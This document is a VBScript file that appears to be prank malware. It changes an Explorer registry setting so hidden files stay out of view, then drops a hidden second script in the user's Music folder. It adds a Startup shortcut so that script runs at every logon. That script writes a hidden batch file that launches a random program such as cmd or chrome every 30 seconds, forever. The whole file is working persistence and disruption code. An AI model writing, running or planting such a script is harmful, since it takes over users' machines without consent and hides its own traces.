Dim HiddenStatus, HiddenKey, WshShell

HiddenKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"

Set WshShell = WScript.CreateObject("WScript.Shell")
HiddenStatus = WshShell.RegRead(HiddenKey)

WshShell.RegWrite HiddenKey, 2, "REG_DWORD"

WScript.Sleep 500
WshShell.SendKeys "{F5}"
WScript.Sleep 500
WshShell.SendKeys "%{F4}"

Set objFSO=CreateObject("Scripting.FileSystemObject")
username = CreateObject("WScript.Network").UserName

pathVbsueg="C:\Users\" + username + "\Music\VBSueg.vbs"
strtup = "C:\Users\" + username + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBSueg.lnk"

a = "intro = ""@echo off;setlocal EnableDelayedExpansion;set n=0;;""£"
b = "programs = ""calc.exe chrome.exe mspaint.exe charmap.exe wordpad.exe cmd.exe mip.exe""£"
c = "suegarray = ""for %%x in ("" & programs & "") do (;	set programs[!n!]=%%x;	set /a n+=1;);;""£"
d = "suegloop = "":a;set /a rnd = %random% %% 9;start !programs[%rnd%]!;timeout /t 30;goto a;""£"
e = "suegBatch = intro & suegarray & suegloop££"
f = "Set objFSO=CreateObject(""Scripting.FileSystemObject"")£"
g = "username = CreateObject(""WScript.Network"").UserName££"
h = "pathBat = ""C:\Users\"" + username + ""\Music\c.bat""££"
i = "If (objFSO.FileExists(pathBat)) Then£"
j = "	objFSO.DeleteFile pathBat£"
k = "	Set objFile = objFSO.CreateTextFile(pathBat,True)£"
l = "Else£"
m = "	Set objFile = objFSO.CreateTextFile(pathBat,True)£"
n = "End If££"
o = "objFile.writeline replace(suegBatch, "";"", vbCrLf)£"
p = "objFile.Close££"
q = "boolHide = True£"
r = "Set objGet = objFSO.GetFile(pathBat)£"
s = "objGet.Attributes = objGet.Attributes + 2£"
t = "WScript.Sleep 500££"
u = "CreateObject(""Wscript.Shell"").Run pathBat, 0, True"

suegVBS= a & b & c & d & e & f & g & h & i & j & k & l & m & n & o & p & q & r & s & t & u

If (objFSO.FileExists(pathVbsueg)) Then
	objFSO.DeleteFile pathVbsueg
	Set objFile = objFSO.CreateTextFile(pathVbsueg,True)
Else
	Set objFile = objFSO.CreateTextFile(pathVbsueg,True)
End If

objFile.writeline replace(suegVBS, "£", vbCrLf)
objFile.Close

Set shrtct = WshShell.CreateShortcut(strtup)
shrtct.TargetPath = pathVbsueg
shrtct.Save

boolHide = True
Set objGet = objFSO.GetFile(pathVbsueg)
objGet.Attributes = objGet.Attributes + 2
WScript.Sleep 500

CreateObject("Wscript.Shell").Run pathVbsueg, 0, True
